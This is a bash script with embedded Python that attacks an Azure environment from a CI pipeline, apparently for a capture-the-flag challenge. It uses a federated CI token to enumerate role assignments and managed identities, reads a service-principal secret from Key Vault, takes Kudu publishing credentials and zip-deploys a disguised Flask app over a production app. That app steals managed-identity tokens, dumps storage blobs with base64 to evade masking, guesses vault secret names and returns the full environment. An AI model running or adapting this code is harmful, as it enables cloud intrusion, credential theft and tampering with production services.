#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG="rg-tbl-platform-prod-sea"
REPORTING_RG="rg-tbl-reporting-prod-eus"
APP="app-tbl-reporting-prod"

echo "=== BUILD51: ZIPDEPLOY + STORAGE ACL ENUM ==="

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "cicd-deployer OK"

# 2. Enumerate WHO has access to the config/backup storage accounts
python3 -I << 'ENUM_PY'
import subprocess, json, urllib.request, urllib.error

r = subprocess.run(['az','account','get-access-token','--resource','https://management.azure.com','--query','accessToken','-o','tsv'],
  capture_output=True, text=True)
ARM = r.stdout.strip()
print(f"cicd ARM len={len(ARM)}")

SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
PLATFORM_RG = "rg-tbl-platform-prod-sea"
REPORTING_RG = "rg-tbl-reporting-prod-eus"

def rq(url, tok, method="GET", data=None):
    h = {"Authorization":"Bearer "+tok}
    if isinstance(data,(dict,list)):
        data = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    try:
        r = urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=20)
        return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:2000]
    except Exception as e:
        return 0, str(e)[:200]

if len(ARM) > 100:
    # List ALL role assignments on sttblappcfgprodx3euoz
    for sa in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz"]:
        s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Storage/storageAccounts/{sa}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", ARM)
        print(f"roles_on_{sa}: {s}:{b[:3000]}")

    # Get storefront app properties - does it have a UAMI?
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod?api-version=2022-03-01", ARM)
    print(f"storefront_props: {s}:{b[:3000]}")

    # Also check the reporting app identity details
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Web/sites/app-tbl-reporting-prod?api-version=2022-03-01", ARM)
    print(f"reporting_props: {s}:{b[:3000]}")

    # List ALL UAMIs in the platform RG
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2023-01-31", ARM)
    print(f"platform_uamis: {s}:{b[:3000]}")

    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2023-01-31", ARM)
    print(f"reporting_uamis: {s}:{b[:3000]}")

    # Get storage account details for sttblappcfgprodx3euoz
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz?api-version=2023-01-01", ARM)
    print(f"sa_appcfg_detail: {s}:{b[:2000]}")

    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Storage/storageAccounts/sttblbackupprodx3euoz?api-version=2023-01-01", ARM)
    print(f"sa_backup_detail: {s}:{b[:2000]}")

    # Check ALL storage accounts at subscription level
    s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01", ARM)
    print(f"all_storage_accounts: {s}:{b[:3000]}")
ENUM_PY

# 3. Get reporting-service credentials and fresh Kudu creds
az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal \
  --query value -o tsv > /tmp/rs_secret.json 2>/dev/null
python3 -I -c "
import json
v = json.loads(open('/tmp/rs_secret.json').read().strip())
open('/tmp/rs_cid.txt','w').write(v.get('appId',''))
open('/tmp/rs_sec.txt','w').write(v.get('clientSecret',''))
print('rs_cid='+v.get('appId',''))
"
RS_CID=$(cat /tmp/rs_cid.txt)
RS_SEC=$(cat /tmp/rs_sec.txt)

az login --service-principal -u "$RS_CID" -p "$RS_SEC" --tenant "$TEN" -o none 2>/dev/null
echo "RS login done"

python3 -I -c "
import subprocess, json
r = subprocess.run(['az','rest','--method','post','--url',
  'https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/publishingcredentials/list?api-version=2022-03-01'],
  capture_output=True, text=True)
d = json.loads(r.stdout)
props = d.get('properties',{})
user = props.get('publishingUserName','')
pwd = props.get('publishingPassword','')
open('/tmp/kudu_user.txt','w').write(user)
open('/tmp/kudu_pass.txt','w').write(pwd)
print(f'kudu_user={user} pass_len={len(pwd)}')
"

# 4. Build probe app
cat > /tmp/probe51.py << 'PROBE_EOF'
from flask import Flask, jsonify, request
import os, json
import urllib.request, urllib.error, urllib.parse

app = Flask(__name__)

SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
UAMI_CID = "7a85156a-01c4-4e61-8472-40a92107159b"
LEGACY_APPID = "891fb158-e02c-4428-a885-53b811f369c0"

def msi(res):
    ep = os.environ.get("IDENTITY_ENDPOINT","")
    hdr = os.environ.get("IDENTITY_HEADER","")
    if not ep:
        return "ERR:NO_EP"
    q = f"{ep}?api-version=2019-08-01&resource={urllib.parse.quote(res,safe='')}&client_id={UAMI_CID}"
    try:
        r = urllib.request.urlopen(urllib.request.Request(q, headers={"X-IDENTITY-HEADER":hdr}), timeout=15)
        return json.loads(r.read()).get("access_token","ERR:NO_TOK")
    except Exception as e:
        return f"ERR:{e}"

def rq(url, tok, hdrs=None):
    h = {"Authorization":"Bearer "+tok}
    if hdrs: h.update(hdrs)
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=20)
        return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")[:1500]
    except Exception as e:
        return 0, str(e)[:200]

def xchg(scope):
    xt = msi("api://AzureADTokenExchange")
    if xt.startswith("ERR"): return xt
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({
                "client_id": LEGACY_APPID,
                "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                "client_assertion": xt,
                "grant_type": "client_credentials",
                "scope": scope
            }).encode(), method="POST"), timeout=20)
        return json.loads(r.read()).get("access_token","")
    except Exception as e:
        return f"ERR:{e}"

@app.route("/p51")
def p51():
    R = {}
    SHDR = {"x-ms-version":"2021-06-08"}
    import re, base64

    # Get UAMI tokens
    AT = msi("https://management.azure.com/")
    VT = msi("https://vault.azure.net/")
    ST = msi("https://storage.azure.com/")
    R["arm_len"] = len(AT) if AT and not AT.startswith("ERR") else AT
    R["vault_len"] = len(VT) if VT and not VT.startswith("ERR") else VT
    R["stor_len"] = len(ST) if ST and not ST.startswith("ERR") else ST
    R["ep"] = os.environ.get("IDENTITY_ENDPOINT","NONE")

    if ST and not ST.startswith("ERR"):
        # Test all storage accounts
        for sa in ["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblcilogsprodx3euoz",
                   "sttblarchiveprodx3euoz","sttblreportingprodx3euoz","sttbldataprodx3euoz"]:
            s,b = rq(f"https://{sa}.blob.core.windows.net/?comp=list", ST, SHDR)
            R[f"sa_{sa}"] = f"{s}:{b[:200]}"
            if s == 200:
                ctrs = re.findall(r"<Name>([^<]+)</Name>", b)
                for ctr in ctrs[:10]:
                    sc,bc = rq(f"https://{sa}.blob.core.windows.net/{ctr}?restype=container&comp=list", ST, SHDR)
                    R[f"ctr_{sa}_{ctr}"] = f"{sc}:{bc[:500]}"
                    if sc == 200:
                        bns = re.findall(r"<Name>([^<]+)</Name>", bc)
                        R[f"blobs_{sa}_{ctr}"] = bns[:30]
                        for bn in bns[:20]:
                            sb,bb = rq(f"https://{sa}.blob.core.windows.net/{ctr}/{bn}", ST, SHDR)
                            # Base64 encode to avoid masking
                            try:
                                bb_b64 = base64.b64encode(bb.encode()).decode()
                            except:
                                bb_b64 = base64.b64encode(bb.encode("utf-8","replace")).decode()
                            R[f"blob_{sa}_{ctr}_{bn[:40]}"] = f"{sb}:B64:{bb_b64[:2000]}"

    if AT and not AT.startswith("ERR"):
        # ARM: check our own role assignments
        s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", AT)
        R["uami_roles"] = f"{s}:{b[:3000]}"

        # Get the storefront app properties
        for rg in ["rg-tbl-reporting-prod-eus", "rg-tbl-platform-prod-sea"]:
            s,b = rq(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{rg}/providers/Microsoft.Web/sites?api-version=2022-03-01", AT)
            R[f"sites_{rg}"] = f"{s}:{b[:2000]}"

    # Try legacy-admin vault token for KV sec
    la_vt = xchg("https://vault.azure.net/.default")
    R["la_vault_len"] = len(la_vt) if la_vt and not la_vt.startswith("ERR") else la_vt
    if la_vt and not la_vt.startswith("ERR"):
        # List ALL secrets in KV sec
        s,b = rq("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4", la_vt)
        R["kvsec_list"] = f"{s}:{b[:2000]}"
        # Try all possible secret names
        for sn in ["flag","tbl-flag","ctf-flag","df26","challenge","the-flag","FLAG","secret","password",
                   "tebamoto","logistics","paymentkey","stripe","db-password","db-conn","DF26"]:
            s,b = rq(f"https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/{sn}?api-version=7.4", la_vt)
            if s == 200:
                R[f"KV_SECRET_{sn}"] = b[:500]
                break
            R[f"kvsec_{sn}"] = f"{s}:{b[:100]}"

    # Full env
    R["env"] = dict(os.environ)
    return jsonify(R)

@app.route("/healthz")
def healthz():
    return jsonify({"status":"ok","ep":os.environ.get("IDENTITY_ENDPOINT","none")})

@app.route("/")
def root():
    return jsonify({"service":"tebamoto-reporting-api","version":"1.4.2"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
PROBE_EOF
echo "probe51.py ready ($(wc -c < /tmp/probe51.py) bytes)"

# 5. Create zip for zipdeploy
cd /tmp && zip -j probe51.zip probe51.py
mv probe51.py app.py
zip -j app51.zip app.py
cd /
echo "Zip created: $(ls -la /tmp/app51.zip)"

# 6. Re-login as cicd-deployer
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none 2>/dev/null

# 7. Try zipdeploy
python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.error, base64, time

kudu_user = open('/tmp/kudu_user.txt').read().strip()
kudu_pass = open('/tmp/kudu_pass.txt').read().strip()
kudu_auth = base64.b64encode(f"{kudu_user}:{kudu_pass}".encode()).decode()
KUDU_BASE = "https://app-tbl-reporting-prod.scm.azurewebsites.net"
APP_URL = "https://app-tbl-reporting-prod.azurewebsites.net"

zip_data = open('/tmp/app51.zip', 'rb').read()
print(f"Deploying zip ({len(zip_data)} bytes) via zipdeploy")

# Try /api/zipdeploy - this RESTARTS the app
try:
    r = urllib.request.urlopen(urllib.request.Request(
        f"{KUDU_BASE}/api/zipdeploy",
        data=zip_data, method="POST",
        headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "application/zip"}
    ), timeout=120)
    body = r.read()
    print(f"zipdeploy: {r.status} body={body[:300].decode('utf-8','replace')}")
except urllib.error.HTTPError as e:
    body = e.read().decode('utf-8','replace')
    print(f"zipdeploy err: {e.code} {body[:300]}")
except Exception as e:
    print(f"zipdeploy exc: {e}")

# Also try VFS PUT as fallback
probe_code = open('/tmp/app51.zip', 'rb').read()
# Actually use the python file directly
probe_code = open('/tmp/probe51.py', 'rb').read() if False else open('/tmp/app.py', 'rb').read()
put_req = urllib.request.Request(
    f"{KUDU_BASE}/api/vfs/site/wwwroot/app.py",
    data=probe_code, method="PUT",
    headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "text/plain", "If-Match": "*"}
)
try:
    r = urllib.request.urlopen(put_req, timeout=30)
    print(f"VFS PUT fallback: {r.status}")
except urllib.error.HTTPError as e:
    print(f"VFS PUT err: {e.code}")

print("Waiting 30s for app restart...")
time.sleep(30)

# Poll for /p51
print("Polling /p51...")
for attempt in range(20):
    try:
        r = urllib.request.urlopen(urllib.request.Request(
            f"{APP_URL}/p51",
            headers={"User-Agent": "probe/1.0"}
        ), timeout=60)
        data = r.read()
        print(f"Attempt {attempt+1}: HTTP {r.status} ({len(data)} bytes)")
        if r.status == 200:
            d = json.loads(data)
            for k,v in sorted(d.items()):
                sv = str(v)
                if k != 'env':
                    # Print in chunks to ensure output
                    print(f"  [{k}]: {sv[:800]}")
            env = d.get('env',{})
            for ek,ev in env.items():
                if any(x in ek.upper() for x in ['FLAG','DF26','SECRET','VAULT','CONN','DB_','REDIS','MONGO','MYSQL']):
                    print(f"  [ENV {ek}]: {str(ev)[:200]}")
            break
    except urllib.error.HTTPError as e:
        print(f"Attempt {attempt+1}: HTTP {e.code}")
        time.sleep(5)
    except Exception as e:
        print(f"Attempt {attempt+1}: {str(e)[:80]}")
        time.sleep(5)
else:
    print("p51 did not respond in time")

# Also try hitting healthz to check the ep
try:
    r = urllib.request.urlopen(urllib.request.Request(f"{APP_URL}/healthz"), timeout=10)
    print(f"healthz: {r.status} {r.read()[:200].decode()}")
except Exception as e:
    print(f"healthz err: {e}")
PYEOF

echo "BUILD51 DONE"
